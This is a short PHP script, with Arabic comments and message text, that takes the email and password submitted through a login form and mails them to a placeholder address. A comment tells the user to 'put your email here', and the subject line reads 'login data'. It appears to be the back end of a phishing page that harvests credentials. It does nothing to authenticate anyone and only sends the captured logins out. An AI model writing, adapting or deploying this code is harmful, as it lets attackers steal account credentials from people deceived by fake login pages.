<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "youremail@example.com"; // ضع إيميلك هنا
    $subject = "بيانات تسجيل الدخول";
    $message = "الإيميل: " . $email . "\nكلمة المرور: " . $password;
    $headers = "From: no-reply@yourdomain.com";

    mail($to, $subject, $message, $headers);
}
?>
